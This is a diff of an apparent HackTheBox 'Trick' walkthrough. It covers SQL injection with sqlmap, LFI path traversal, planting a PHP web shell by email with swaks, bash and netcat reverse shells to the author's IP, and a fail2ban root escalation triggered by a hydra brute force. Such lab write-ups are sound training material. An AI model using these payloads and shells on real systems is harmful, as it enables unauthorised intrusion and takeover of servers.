@@ -11,7 +11,8 @@ Welcome to Trick. This machine isn’t a sci-fi anomaly; it’s a monument to co
 It perfectly illustrates the fundamental law of the digital underground: you don’t always need a flashy zero-day exploit to burn a system down; 
 you just need to read the manual better than the person who built it..
 
-Target IP 10.129.26.93
+2 sessions for this try, so 2 IPs
+Target IP 10.129.26.93 / 10.129.227.180
 My IP 10.10.14.138
 
 ## nmap
@@ -56,24 +57,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 241.39 seconds
 ```
 ## SMTP
-Every script is not working
+can't reach it
 ```bash
-┌─[✗]─[root@htb-mcnqme24xk]─[/home/justdave]
-└──╼ #nmap -p 25 --script=smtp-enum-users 10.129.26.93
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-20 21:55 EDT
-Nmap scan report for 10.129.26.93
-Host is up (0.0077s latency).
-
-PORT   STATE SERVICE
-25/tcp open  smtp
-| smtp-enum-users: 
-|_  Couldn't establish connection on port 25
-
-─[root@htb-mcnqme24xk]─[/home/justdave]
-└──╼ #nmap -p 25 --script smtp-commands,smtp-ntlm-info 10.129.26.93
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-20 21:56 EDT
-Nmap scan report for 10.129.26.93
-Host is up (0.0076s latency).
 
 PORT   STATE SERVICE
 25/tcp open  smtp
@@ -155,7 +140,7 @@ update file hosts with findings
 echo '10.129.26.93 trick.htb preprod-payroll.trick.htb' | sudo tee -a /etc/hosts
 ```
 
-subdomain enum but got nothing
+subdomain enum 
 ```bash
 ┌─[✗]─[root@htb-mcnqme24xk]─[/home/justdave]
 └──╼ #ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.129.26.93 -H "Host: FUZZ.trick.htb" -fs 5480
@@ -184,133 +169,39 @@ ________________________________________________
 
 :: Progress: [4614/4614] :: Job [1/1] :: 5000 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
 ```
-nothing... trying to visit the sites for info http://preprod-payroll.trick.htb/ajax.php?action=login
-based on page source, the web app is real - "Employee's Payroll Management System" 
-the most fun exploit is related t SQL injection, try
+Based on url structure i want to try a thing
 ```bash
-┌─[✗]─[root@htb-mcnqme24xk]─[/home/justdave]
-└──╼ #sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --batch
-        ___
-       __H__
- ___ ___[.]_____ ___ ___  {1.9.6#stable}
-|_ -| . [.]     | .'| . |
-|___|_  [.]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
+─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-j4o38yc17j]─[~]
+└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://trick.htb -H "Host:preprod-FUZZ.trick.htb" -ac
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
-[*] starting @ 22:32:51 /2026-06-20/
+       v2.1.0-dev
+________________________________________________
 
-[22:32:51] [INFO] testing connection to the target URL
-you have not declared cookie(s), while server wants to set its own ('PHPSESSID=t14nre05vip...5fcgfru14j'). Do you want to use those [Y/n] Y
-[22:32:51] [INFO] testing if the target URL content is stable
-[22:32:52] [INFO] target URL content is stable
-[22:32:52] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
-[22:32:52] [INFO] testing for SQL injection on POST parameter 'username'
-[22:32:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[22:32:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
-[22:32:52] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
-[22:32:52] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
-[22:32:52] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
-[22:32:52] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
-[22:32:52] [INFO] testing 'Generic inline queries'
-[22:32:52] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
-[22:32:52] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
-[22:32:52] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
-[22:32:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
-[22:33:02] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
-it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
-[22:33:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-[22:33:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-[22:33:02] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-[22:33:02] [INFO] target URL appears to have 8 columns in query
-do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
-injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
-[22:33:03] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
-[22:33:03] [INFO] target URL appears to be UNION injectable with 8 columns
-injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
-[22:33:04] [INFO] checking if the injection point on POST parameter 'username' is a false positive
-POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
----
-Parameter: username (POST)
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: username=abc' AND (SELECT 5177 FROM (SELECT(SLEEP(5)))vFiB) AND 'SQPo'='SQPo&password=abc
----
-[22:33:19] [INFO] the back-end DBMS is MySQL
-[22:33:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
-web application technology: Nginx 1.14.2, PHP
-back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
-[22:33:24] [INFO] fetched data logged to text files under '/root/.local/share/s
+ :: Method           : GET
+ :: URL              : http://trick.htb
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: preprod-FUZZ.trick.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 8ms]
+payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 39ms]
+
+
 ```
+ok hot one thing interesting, i'll add to the hosts file
 
-```bash
-┌─[root@htb-mcnqme24xk]─[/home/justdave]
-└──╼ #sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --level 5 --risk 3 --technique=BEUS -- batch
-
-.....
-
-sqlmap identified the following injection point(s) with a total of 6745 HTTP(s) requests:
----
-Parameter: username (POST)
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
-    Payload: username=abc' OR NOT 5738=5738-- ZPQj&password=abc
-
-    Type: error-based
-    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: username=abc' OR (SELECT 4199 FROM(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(4199=4199,1))),0x7171707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uVuj&password=abc
----
-[22:43:02] [INFO] the back-end DBMS is MySQL
-web application technology: Nginx 1.14.2, PHP
-back-end DBMS: MySQL >= 5.0 (MariaDB fork)
-[22:43:02] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
-[22:43:02] [WARNING] your sqlmap version is outdated
-```
-
-
-```bash
-─[root@htb-mcnqme24xk]─[/home/justdave]
-└──╼ #sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --privileges
-
-....
-[22:45:06] [INFO] the back-end DBMS is MySQL
-web application technology: Nginx 1.14.2, PHP
-back-end DBMS: MySQL >= 5.0 (MariaDB fork)
-[22:45:06] [INFO] fetching database users privileges
-[22:45:06] [INFO] retrieved: ''remo'@'localhost''
-[22:45:06] [INFO] retrieved: 'FILE'
-database management system users privileges:
-[*] 'remo'@'localhost' [1]:
-    privilege: FILE
-
-[22:45:06] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
-[22:45:06] [WARNING] your sqlmap version is outdated
-```
-
-```bash
-┌─[root@htb-mcnqme24xk]─[/home/justdave]
-└──╼ #sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --batch --file-read=/etc/passwd
-
-....
-22:46:52] [INFO] fetching file: '/etc/passwd'
-[22:46:54] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
-
-┌─[root@htb-mcnqme24xk]─[/home/justdave]
-└──╼ #cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
-....
-michael:x:1001:1001::/home/michael:/bin/bash
-
-
-┌─[root@htb-mcnqme24xk]─[/home/justdave]
-└──╼ #sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --batch --file-read=/etc/nginx/sites￾enabled/default
-[22:57:47] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default' and the remote file '/etc/nginx/sites-enabled/default' have the same size (1058 B)
-```
-checking the last file i see a new domain hidden inside, i'll add
-preprod-marketing.trick.htb
 ```bash
 echo '10.129.26.93 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
 ```
@@ -318,25 +209,111 @@ checking this new website, an URL is interesting
 http://preprod-marketing.trick.htb/index.php?page=services.html
  it might be vulnerable to Local File Inclusion, let's try to double the chrs
 
-this works lol
+...and it works...
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd
- 
-```bash
 
+Note: from here another session
+Target IP 10.129.227.180
+kinda feel blocked atm
+
+Based on what i saw you can send an email to the  user found, michael
+Since PHP wrap’s everything in index.php, if we can view michaels email through our LFI, and if we can send michael an email 
+with a bind shell in it, we may be able to get code execution on the server.
+```bash
+─[eu-dedivip-1]─[10.10.14.138]─[justdave@htb-j4o38yc17j]─[~]
+└──╼ [★]$ swaks --to michael --from ATalkingCat --header 'Subject: Testing!' --body '<?php system($_REQUEST["cmd"]); ?>' --server 10.129.227.180
+=== Trying 10.129.227.180:25...
+=== Connected to 10.129.227.180.
+<-  220 debian.localdomain ESMTP Postfix (Debian/GNU)
+ -> EHLO htb-j4o38yc17j
+<-  250-debian.localdomain
+<-  250-PIPELINING
+<-  250-SIZE 10240000
+<-  250-VRFY
+<-  250-ETRN
+<-  250-STARTTLS
+<-  250-ENHANCEDSTATUSCODES
+<-  250-8BITMIME
+<-  250-DSN
+<-  250-SMTPUTF8
+<-  250 CHUNKING
+ -> MAIL FROM:<ATalkingCat>
+<-  250 2.1.0 Ok
+ -> RCPT TO:<michael>
+<-  250 2.1.5 Ok
+ -> DATA
+<-  354 End data with <CR><LF>.<CR><LF>
+ -> Date: Mon, 22 Jun 2026 08:36:10 -0400
+ -> To: michael
+ -> From: ATalkingCat
+ -> Subject: Testing!
+ -> Message-Id: <20260622083610.211384@htb-j4o38yc17j>
+ -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ -> 
+ -> <?php system($_REQUEST["cmd"]); ?>
+ -> 
+ -> 
+ -> .
+<-  250 2.0.0 Ok: queued as 42BFB4099D
+ -> QUIT
+<-  221 2.0.0 Bye
+=== Connection closed with remote host.
+```
+checking via browser
+let's see if the mail is present 
+```bash
+http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael
+```
+maybe it works...and yes
+```bash
+http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&cmd=id'
 ```
 
+so i could open a listener on my machine and run reverse shell
+```bash
+on my machine nc -lvnp 4444
 
+http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.138/4321 0>%261'
+```
 
+i got a shell with the user michael so i go direct to the flag... michael@trick:~$ cat user.txt
+for pesistance we can go to michael@trick:~/.ssh$
+to loot the files to use, now for the escalation part
 
+```bash
+michael@trick:~$ sudo -l
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
 
+michael@trick:~$ id
+uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
 
+michael@trick:~$ find / -group security 2>/dev/null
+/etc/fail2ban/action.d
 
+michael@trick:~$ ls /etc/fail2ban/action.d/
 
+```
+michael can restart fail2ban as root.
+after some tests, to abuse the system, it involves creating a .local file that will override the .conf file in the iptables configuration.
 
+```bash
+going in the directory makes it feel easy /etc/fail2ban/action.d/
 
+cp ./iptables-multiport.conf ./iptables-multiport.local
+No nano, and only VIM avaiable but no thanks
+echo "actionban = /usr/bin/nc 10.10.14.138 1234 -e /bin/bash" >> iptables-multiport.local
 
+while on my machine i set up a listener nc -lnvp 1234
 
+sudo /etc/init.d/fail2ban restart
+and nothing, we need t otrigger the ban
 
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+hydra -l root -P /usr/share/wordlists/rockyou.txt 10.129.227.180 ssh
 
-
+and yes, i am root
+```
